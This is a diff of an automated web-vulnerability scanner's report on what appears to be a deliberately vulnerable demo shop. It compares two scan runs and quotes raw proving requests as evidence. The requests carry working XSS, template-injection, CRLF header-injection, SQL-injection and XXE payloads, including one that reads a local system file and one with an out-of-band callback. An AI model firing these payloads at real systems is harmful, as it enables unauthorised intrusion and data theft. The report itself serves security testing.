-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -906,7 +712,6 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
 
@@ -917,7 +722,6 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
 
@@ -928,7 +732,6 @@ findings: F-4df129b258 | chain_rule: — | mitigations absent: ["content-securit
   - `finding` ref `F-4df129b258` excerpt: `impact grade=proven; chain: re-test:variant-battery-6 on GET https://ginandjuice.shop/catalog`
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
 
@@ -957,17 +760,17 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-09eb9786` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=%7B%7B7%2A7%7D%7D
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-2f72e919` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Cimg+src%3Dx+onerror%3Dsentinel42%28%29%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:23:01 GMT
+      date: Sun, 04 Oct 2026 11:31:32 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9379
+      content-length: 9435
       connection: keep-alive
-      set-cookie: category={{7*7}}; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<img src=x onerror=sentinel42()>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -978,7 +781,6 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
   - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
 
 **[ENTRY] — verified**
@@ -988,20 +790,18 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
   - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
-  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1017,20 +817,18 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
   - `finding` ref `F-e6ca09b8b8` excerpt: `verification: re-test:fresh-header-name (passed=True)`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
-  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1046,25 +844,23 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
   - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
 
 **[AUTHORIZATION] — verified**
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
 
-  - `journal` ref `req-00eb0dfb` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1075,7 +871,6 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
   - `finding` ref `F-e6ca09b8b8` excerpt: `CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
 
 **[STATE] — verified**
@@ -1085,7 +880,6 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
   - `finding` ref `F-e6ca09b8b8` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
 
 **[IMPACT] — verified**
@@ -1094,7 +888,6 @@ findings: F-e6ca09b8b8 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-e6ca09b8b8` excerpt: `impact grade=proven; chain: re-test:fresh-header-name on GET https://ginandjuice.shop/catalog`
     finding: http_response_header_injection GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
-      evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       evidence[header_value]: CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
       verification: re-test:fresh-header-name passed=True conf=0.9 rounds=1
 
@@ -1123,49 +916,49 @@ findings: F-98386c0986 | chain_rule: — | mitigations absent: []
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-95974851` excerpt: `AWSALB=[REDACTED]`
+  - `journal` ref `req-adf27360` excerpt: `AWSALB=[REDACTED]`
     REQUEST  POST https://ginandjuice.shop/catalog/product/stock
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/xml
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "https://webhook.site/[REDACTED]?i=oob-f582348...
+      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>1</productId><storeId>1<...
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:25:37 GMT
+      date: Sun, 04 Oct 2026 11:33:44 GMT
       content-type: text/plain; charset=utf-8
       content-length: 3
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: 998
-  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
+      body[0:200]: 315
+  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (inter`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
 
 **[ENTRY] — verified**
 
   POST https://ginandjuice.shop/catalog/product/stock — parameter productId
 
-  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
+  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (inter`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
-  - `journal` ref `req-31c7bf3b` excerpt: `https://ginandjuice.shop/catalog/product/stock`
+  - `journal` ref `req-09c6f8c4` excerpt: `https://ginandjuice.shop/catalog/product/stock`
     REQUEST  POST https://ginandjuice.shop/catalog/product/stock
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/xml
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>4</produ...
+      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>1</produ...
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:25:29 GMT
+      date: Sun, 04 Oct 2026 11:33:42 GMT
       content-type: text/plain; charset=utf-8
       content-length: 3
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: 998
+      body[0:200]: 315
 
 **[ACTION] — verified**
 
@@ -1173,55 +966,55 @@ findings: F-98386c0986 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-98386c0986` excerpt: `verification: re-test:fresh-interaction-id (passed=True)`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
-  - `journal` ref `req-31c7bf3b` excerpt: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-co`
+  - `journal` ref `req-09c6f8c4` excerpt: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-co`
     REQUEST  POST https://ginandjuice.shop/catalog/product/stock
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/xml
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>4</produ...
+      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>1</produ...
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:25:29 GMT
+      date: Sun, 04 Oct 2026 11:33:42 GMT
       content-type: text/plain; charset=utf-8
       content-length: 3
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: 998
+      body[0:200]: 315
 
 **[OBJECT] — verified**
 
   the XML entity resolver (local file content reached the response)
 
-  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
+  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (inter`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
 
 **[AUTHORIZATION] — verified**
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: <?xml version)
 
-  - `journal` ref `req-31c7bf3b` excerpt: `AWSALB=[REDACTED]`
+  - `journal` ref `req-09c6f8c4` excerpt: `AWSALB=[REDACTED]`
     REQUEST  POST https://ginandjuice.shop/catalog/product/stock
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Content-Type: application/xml
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>4</produ...
+      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///nonexistent-sentinel-control">]><stockCheck><productId>1</produ...
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:25:29 GMT
+      date: Sun, 04 Oct 2026 11:33:42 GMT
       content-type: text/plain; charset=utf-8
       content-length: 3
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: 998
-  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (intera`
+      body[0:200]: 315
+  - `finding` ref `F-98386c0986` excerpt: `target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (inter`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
 
 **[STATE] — verified**
@@ -1230,7 +1023,7 @@ findings: F-98386c0986 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-98386c0986` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
 
 **[IMPACT] — verified**
@@ -1239,7 +1032,7 @@ findings: F-98386c0986 | chain_rule: — | mitigations absent: []
 
   - `finding` ref `F-98386c0986` excerpt: `impact grade=proven; chain: re-test:fresh-interaction-id on POST https://ginandjuice.shop/catalog/product/stock`
     finding: xxe POST https://ginandjuice.shop/catalog/product/stock param=productId status=verified conf=0.9
-      evidence[oob_callback]: target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET
+      evidence[oob_callback]: target fetched the external entity out-of-band from 18.200.201.133 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GE
       verification: re-test:fresh-interaction-id passed=True conf=0.9 rounds=1
 
 </details>
@@ -1267,17 +1060,17 @@ findings: F-277b70ea40 | chain_rule: — | mitigations absent: []
 
   anonymous web session — cookie AWSALB, AWSALBCORS, TrackingId carried by the raw proving requests; provenance not retained in the journal; no Authorization/credential material in any proving request
 
-  - `journal` ref `req-6fdb342e` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=1+AND+1%3D2
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-e88207d7` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D2--
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:23 GMT
+      date: Sun, 04 Oct 2026 11:31:25 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9383
+      content-length: 9392
       connection: keep-alive
-      set-cookie: category=1 AND 1=2; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=1' OR 1=2--; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1302,17 +1095,17 @@ findings: F-277b70ea40 | chain_rule: — | mitigations absent: []
       evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
       evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
       verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
-  - `journal` ref `req-040a8c67` excerpt: `https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-6125b9a6` excerpt: `https://ginandjuice.shop/catalog?category=1+AND+1%3D2`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=1+AND+1%3D2
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:26 GMT
+      date: Sun, 04 Oct 2026 11:31:21 GMT
       content-type: text/html; charset=utf-8
-      content-length: 17079
+      content-length: 9383
       connection: keep-alive
-      set-cookie: category=1' OR 1=1--; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=1 AND 1=2; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1331,17 +1124,17 @@ findings: F-277b70ea40 | chain_rule: — | mitigations absent: []
       evidence[response_diff]: OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
       evidence[response_diff]: numeric-OR body-size differential on condition flip: TRUE 17076B vs FALSE 9391B (numeric-shape boolean oracle)
       verification: oracle:or-bodydiff-2round passed=True conf=0.95 rounds=2
-  - `journal` ref `req-040a8c67` excerpt: `https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-6125b9a6` excerpt: `https://ginandjuice.shop/catalog?category=1+AND+1%3D2`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=1+AND+1%3D2
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:26 GMT
+      date: Sun, 04 Oct 2026 11:31:21 GMT
       content-type: text/html; charset=utf-8
-      content-length: 17079
+      content-length: 9383
       connection: keep-alive
-      set-cookie: category=1' OR 1=1--; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=1 AND 1=2; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1365,17 +1158,17 @@ findings: F-277b70ea40 | chain_rule: — | mitigations absent: []
 
   the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted
 
-  - `journal` ref `req-040a8c67` excerpt: `AWSALB=[REDACTED]`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=1%27+OR+1%3D1--
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-6125b9a6` excerpt: `AWSALB=[REDACTED]`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=1+AND+1%3D2
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:26 GMT
+      date: Sun, 04 Oct 2026 11:31:21 GMT
       content-type: text/html; charset=utf-8
-      content-length: 17079
+      content-length: 9383
